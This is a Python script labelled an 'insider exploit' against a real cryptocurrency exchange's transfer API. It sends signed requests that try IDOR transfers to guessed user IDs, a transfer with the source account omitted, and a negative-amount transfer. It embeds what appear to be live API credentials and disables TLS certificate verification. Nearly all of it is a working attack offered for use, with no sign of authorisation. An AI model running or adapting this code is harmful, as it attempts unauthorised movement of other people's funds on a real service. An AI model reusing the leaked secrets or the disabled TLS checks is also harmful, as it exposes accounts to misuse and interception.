#!/usr/bin/env python3
import urllib.request
import ssl
import time
import hmac
import hashlib
import json
import uuid
import random

print("="*60, flush=True)
print("BYBIT INSIDER EXPLOIT: UNIVERSAL TRANSFER", flush=True)
print("Target: /v5/asset/transfer/universal-transfer", flush=True)
print("="*60, flush=True)

API_KEY = "22JSr5zWpW0eReC6rE"
API_SECRET = "QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE_URL = "https://api.bybit.com"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# --- Helpers ---
def get_server_offset():
    try:
        req = urllib.request.Request(BASE_URL + "/v5/market/time")
        res = urllib.request.urlopen(req, context=ctx, timeout=5)
        data = json.loads(res.read().decode())
        server_time = int(data['result']['timeSecond']) * 1000
        local_time = int(time.time() * 1000)
        return server_time - local_time
    except:
        return 0

OFFSET = get_server_offset()
print(f"[*] Server Offset: {OFFSET}ms", flush=True)

def send_signed_request(method, endpoint, payload_dict=None):
    timestamp = str(int(time.time() * 1000) + OFFSET)
    recv_window = "20000"
    
    if method == "GET":
        params = urllib.parse.urlencode(payload_dict) if payload_dict else ""
        full_url = f"{BASE_URL}{endpoint}?{params}"
        payload_str = params # GET param string for signature? No, Bybit v5 varies.
        # Actually for V5 GET, sign is timestamp+key+recv_window+queryString
        sign_payload = f"{timestamp}{API_KEY}{recv_window}{params}"
        body = None
    else:
        full_url = f"{BASE_URL}{endpoint}"
        payload_str = json.dumps(payload_dict)
        sign_payload = f"{timestamp}{API_KEY}{recv_window}{payload_str}"
        body = payload_str.encode()

    signature = hmac.new(bytes(API_SECRET, "utf-8"), bytes(sign_payload, "utf-8"), hashlib.sha256).hexdigest()

    req = urllib.request.Request(full_url, data=body, method=method)
    req.add_header("X-BAPI-API-KEY", API_KEY)
    req.add_header("X-BAPI-SIGN", signature)
    req.add_header("X-BAPI-SIGN-TYPE", "2")
    req.add_header("X-BAPI-TIMESTAMP", timestamp)
    req.add_header("X-BAPI-RECV-WINDOW", recv_window)
    req.add_header("Content-Type", "application/json")
    
    try:
        res = urllib.request.urlopen(req, context=ctx, timeout=10)
        return json.loads(res.read().decode())
    except urllib.error.HTTPError as e:
        return {"retCode": -1, "retMsg": e.read().decode()}
    except Exception as e:
        return {"retCode": -1, "retMsg": str(e)}

# --- Step 1: Get My UID ---
print("\n[1] Getting User Info...", flush=True)
user_info = send_signed_request("GET", "/v5/user/query-api")
my_uid = 0

if user_info.get('retCode') == 0:
    my_uid = user_info['result']['userID']
    print(f"âœ“ MY UID: {my_uid}", flush=True)
    print(f"âœ“ Permissions: {user_info['result']['permissions']}", flush=True)
else:
    print(f"âŒ Failed to get UID: {user_info}", flush=True)
    # Fallback to known UID from previous context if possible, or exit
    my_uid = 527465456 
    print(f"âš ï¸ Using fallback UID: {my_uid}", flush=True)

# --- Step 2: Attack Vectors ---

# Vector A: Transfer to random Subaccount ID (IDOR)
# Try to transfer 0.000001 USDT to a nearby UID (simulating subaccount)
target_uids = [my_uid + 1, my_uid + 2, 12345678, 88888888] 

print(f"\n[2] Testing Universal Transfer IDOR...", flush=True)

for target in target_uids:
    trans_id = str(uuid.uuid4())
    print(f"  > Trying transfer Master({my_uid}) -> Target({target})...", flush=True)
    
    payload = {
        "transferId": trans_id,
        "coin": "USDT",
        "amount": "0.01", # Minimum amount?
        "fromMemberId": str(my_uid),
        "toMemberId": str(target),
        "fromAccountType": "UNIFIED",
        "toAccountType": "UNIFIED"
    }
    
    resp = send_signed_request("POST", "/v5/asset/transfer/universal-transfer", payload)
    code = resp.get('retCode')
    msg = resp.get('retMsg')
    
    print(f"    Result: [{code}] {msg}", flush=True)
    
    if code == 0:
        print(f"    ðŸš¨ SUCCESS! MONEY MOVED TO UID {target}!", flush=True)
    elif "balance insufficient" in str(msg).lower():
         print(f"    âš ï¸  Check Passed (Insufficient Balance) - LOGIC EXISTS!", flush=True)
         print(f"    This means we CAN access this transfer path if we had funds.")
    elif "not a sub-account" in str(msg).lower():
         print(f"    âœ“ Blocked: Target not linked sub-account.")

# Vector B: "Ghost" Transfer (Missing fromMemberId)
print(f"\n[3] Testing 'Ghost' Transfer (Missing parameters)...", flush=True)
payload_ghost = {
    "transferId": str(uuid.uuid4()),
    "coin": "USDT",
    "amount": "0.01",
    "toMemberId": str(my_uid), # To self
    # Missing fromMemberId
    "fromAccountType": "UNIFIED",
    "toAccountType": "UNIFIED"
}
resp = send_signed_request("POST", "/v5/asset/transfer/universal-transfer", payload_ghost)
print(f"  > Missing fromMemberId: [{resp.get('retCode')}] {resp.get('retMsg')}", flush=True)

# Vector C: Negative Amount Transfer (Integer Overflow)
print(f"\n[4] Testing Negative Amount...", flush=True)
payload_neg = {
    "transferId": str(uuid.uuid4()),
    "coin": "USDT",
    "amount": "-100",
    "fromMemberId": str(my_uid),
    "toMemberId": str(my_uid),
    "fromAccountType": "UNIFIED",
    "toAccountType": "UNIFIED"
}
resp = send_signed_request("POST", "/v5/asset/transfer/universal-transfer", payload_neg)
print(f"  > Negative Amount: [{resp.get('retCode')}] {resp.get('retMsg')}", flush=True)

print("\nDONE", flush=True)
